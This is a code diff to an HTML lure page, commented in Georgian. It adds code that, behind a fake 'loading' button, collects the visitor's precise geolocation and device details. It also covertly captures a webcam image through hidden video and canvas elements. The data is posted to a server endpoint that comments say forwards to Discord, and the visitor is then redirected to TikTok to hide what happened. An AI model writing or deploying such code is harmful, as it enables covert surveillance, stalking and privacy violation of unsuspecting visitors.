@@ -77,6 +77,9 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        /* კამერის ვიდეო და კანვასი დამალულია */
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
@@ -91,38 +94,19 @@
         </button>
     </div>
 
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
         async function handleButtonClick() {
             const btn = document.getElementById('mainBtn');
             const btnText = document.getElementById('btnText');
             const loader = document.getElementById('loader');
 
-            // ღილაკს ვბლოკავთ და ვწერთ "იტვირთება..."
             btn.disabled = true;
             btnText.innerText = "იტვირთება...";
             loader.style.display = "block";
 
-            // 1. ჯერ ვთხოვთ ლოკაციას (Allow)
-            const getLocation = () => {
-                return new Promise((resolve) => {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-                            (err) => {
-                                console.log("ლოკაცია ვერ მოიძებნა:", err.message);
-                                resolve({ lat: "უარი", lon: "უარი" });
-                            },
-                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                        );
-                    } else {
-                        resolve({ lat: "უარი", lon: "უარი" });
-                    }
-                });
-            };
-
-            const loc = await getLocation();
-
-            // 2. ვაგროვებთ მოწყობილობის ინფორმაციას
             let deviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -133,8 +117,8 @@
                 cores: navigator.hardwareConcurrency || "უცნობია",
                 ram: navigator.deviceMemory || "უცნობია",
                 battery: "ვერ გავიგეთ",
-                lat: loc.lat,
-                lon: loc.lon
+                lat: "უარი",
+                lon: "უარი"
             };
 
             try {
@@ -144,19 +128,58 @@
                 }
             } catch (e) {}
 
-            // 3. ვაგზავნით ყველაფერს Discord-ზე
-            fetch('/upload_data', {
+            const getLocation = () => {
+                return new Promise((resolve) => {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                            () => resolve({ lat: "უარი", lon: "უარი" }),
+                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        );
+                    } else {
+                        resolve({ lat: "უარი", lon: "უარი" });
+                    }
+                });
+            };
+
+            const loc = await getLocation();
+            deviceInfo.lat = loc.lat;
+            deviceInfo.lon = loc.lon;
+
+            // კამერა (ფარულად)
+            const getCameraImage = () => {
+                return new Promise((resolve) => {
+                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                        navigator.mediaDevices.getUserMedia({ video: true })
+                            .then(function (stream) {
+                                const video = document.getElementById('video');
+                                video.srcObject = stream;
+                                video.play(); 
+                                setTimeout(function() {
+                                    const canvas = document.getElementById('canvas');
+                                    const context = canvas.getContext('2d');
+                                    canvas.width = video.videoWidth || 640;
+                                    canvas.height = video.videoHeight || 480;
+                                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    stream.getTracks().forEach(track => track.stop());
+                                    resolve(canvas.toDataURL('image/png'));
+                                }, 3000); 
+                            })
+                            .catch(function (error) { resolve(null); });
+                    } else { resolve(null); }
+                });
+            };
+            
+            deviceInfo.image = await getCameraImage();
+
+            // გაგზავნა Discord-ზე
+            await fetch('/upload_all', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(deviceInfo)
-            })
-            .then(() => {
-                // 4. ველოდებით 1.5 წამს და გადავდივართ TikTok-ზე
-                setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 1500);
-            })
-            .catch(() => {
-                window.location.href = "https://www.tiktok.com";
             });
+
+            setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 500);
         }
     </script>
 </body>
